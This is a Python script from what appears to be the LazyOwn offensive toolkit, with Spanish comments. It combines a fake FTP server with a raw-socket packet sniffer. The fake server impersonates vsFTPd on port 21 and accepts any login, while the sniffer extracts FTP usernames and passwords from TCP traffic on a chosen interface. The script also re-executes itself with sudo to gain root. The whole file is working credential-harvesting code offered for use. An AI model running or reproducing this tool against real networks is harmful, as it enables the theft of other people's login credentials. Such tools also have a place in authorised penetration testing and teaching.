#!/usr/bin/env python3
# _*_ coding: utf8 _*_
"""
app.py

Autor: Gris Iscomeback
Correo electrónico: grisiscomeback[at]gmail[dot]com
Fecha de creación: xx/xx/xxxx
Licencia: GPL v3

Descripción:  
"""
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import sys
import os
import signal
import argparse
import struct
import time
import re

BANNER = """
██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝ ╚═╝ ╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
[*] LazyOwn Sniffer + Fake FTP Server (sin librerías externas) [;,;]
"""

def signal_handler(sig, frame):
    print("\n[!] Interrupción recibida. Saliendo...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def check_sudo():
    if os.geteuid() != 0:
        print("[S] Se necesitan permisos de superusuario. Relanzando con sudo...")
        args = ["sudo", sys.executable] + sys.argv
        os.execvpe("sudo", args, os.environ)

check_sudo()

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Fake FTP Server + Sniffer de credenciales FTP (sin librerías externas)."
    )
    parser.add_argument(
        "-i", "--interface",
        type=str,
        required=True,
        help="Interfaz de red para la captura de paquetes (ej: eth0)"
    )
    parser.add_argument(
        "--no-fake",
        action="store_true",
        help="Desactiva el servidor FTP falso (solo sniffer)"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Muestra el payload completo de cada paquete FTP"
    )
    return parser.parse_args()

# --------------------- Servidor FTP falso ---------------------
def handle_ftp_client(client_sock, addr):
    print(f"[+] Nueva conexión FTP desde {addr[0]}:{addr[1]}")
    try:
        client_sock.send(b"220 (vsFTPd 3.0.3)\r\n")
        while True:
            data = client_sock.recv(1024)
            if not data:
                break
            cmd = data.decode('utf-8', errors='ignore').strip()
            print(f"[FTP] Comando: {cmd}")
            if cmd.upper().startswith("USER"):
                client_sock.send(b"331 Please specify the password.\r\n")
            elif cmd.upper().startswith("PASS"):
                client_sock.send(b"230 Login successful.\r\n")
            elif cmd.upper().startswith("SYST"):
                client_sock.send(b"215 UNIX Type: L8\r\n")
            elif cmd.upper().startswith("QUIT"):
                client_sock.send(b"221 Goodbye.\r\n")
                break
            else:
                client_sock.send(b"200 Command okay.\r\n")
    except Exception as e:
        print(f"[FTP] Error: {e}")
    finally:
        print(f"[-] Conexión FTP cerrada con {addr[0]}")
        client_sock.close()

def run_fake_ftp():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('0.0.0.0', 21))
        server.listen(5)
        print("[FTP] Servidor falso escuchando en 0.0.0.0:21...")
        while True:
            client, addr = server.accept()
            t = threading.Thread(target=handle_ftp_client, args=(client, addr))
            t.daemon = True
            t.start()
    except PermissionError:
        print("[FTP] Error: Necesitas permisos de root para enlazar al puerto 21.")
    except Exception as e:
        print(f"[FTP] Error en servidor: {e}")
    finally:
        server.close()

# --------------------- Sniffer con socket raw (sin scapy) ---------------------
def parse_ip_header(data):
    # data contiene la cabecera IP (al menos 20 bytes)
    ip_header = data[:20]
    iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
    version_ihl = iph[0]
    ihl = version_ihl & 0xF
    ip_header_len = ihl * 4
    protocol = iph[6]
    src = socket.inet_ntoa(iph[8])
    dst = socket.inet_ntoa(iph[9])
    return ip_header_len, protocol, src, dst

def parse_tcp_header(data):
    # data contiene la cabecera TCP (al menos 20 bytes)
    tcp_header = data[:20]
    tcph = struct.unpack('!HHLLBBHHH', tcp_header)
    src_port = tcph[0]
    dst_port = tcph[1]
    offset_res = tcph[4]
    tcp_header_len = (offset_res >> 4) * 4
    return src_port, dst_port, tcp_header_len

def sniffer_loop(interface, verbose=False):
    try:
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        raw_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode() + b'\0')
        print(f"[SNIFFER] Capturando en interfaz {interface} (puerto 21)...")
    except PermissionError:
        print("[SNIFFER] Error: Se necesitan permisos de root para usar socket raw.")
        return
    except Exception as e:
        print(f"[SNIFFER] Error al crear socket: {e}")
        return

    while True:
        try:
            packet, addr = raw_sock.recvfrom(65535)
            ip_header_len, protocol, src_ip, dst_ip = parse_ip_header(packet)
            if protocol != 6:  # Solo TCP
                continue
            tcp_data = packet[ip_header_len:]
            if len(tcp_data) < 20:
                continue
            src_port, dst_port, tcp_header_len = parse_tcp_header(tcp_data)
            if src_port != 21 and dst_port != 21:
                continue
            payload = tcp_data[tcp_header_len:]
            if not payload:
                continue
            try:
                data = payload.decode('utf-8', errors='ignore')
            except:
                continue

            if verbose:
                print(f"[VERBOSE] Payload: {repr(data)}")

            # Buscar USER y PASS en todo el payload (no solo por líneas)
            # Usar expresiones regulares para capturar el argumento
            user_match = re.search(r'USER\s+([^\r\n]+)', data, re.IGNORECASE)
            pass_match = re.search(r'PASS\s+([^\r\n]+)', data, re.IGNORECASE)

            if user_match:
                user = user_match.group(1).strip()
                print(f"[SNIFFER] FTP USER desde {src_ip}:{src_port} -> {dst_ip}:{dst_port} : {user}")
            if pass_match:
                passwd = pass_match.group(1).strip()
                print(f"[SNIFFER] FTP PASS desde {src_ip}:{src_port} -> {dst_ip}:{dst_port} : {passwd}")

        except KeyboardInterrupt:
            break
        except Exception as e:
            if verbose:
                print(f"[SNIFFER] Error: {e}")
            continue

# --------------------- Main ---------------------
def main():
    args = parse_arguments()
    print(BANNER)

    if not args.no_fake:
        ftp_thread = threading.Thread(target=run_fake_ftp, daemon=True)
        ftp_thread.start()
        time.sleep(1)

    sniffer_loop(args.interface, verbose=args.verbose)

if __name__ == "__main__":
    main()
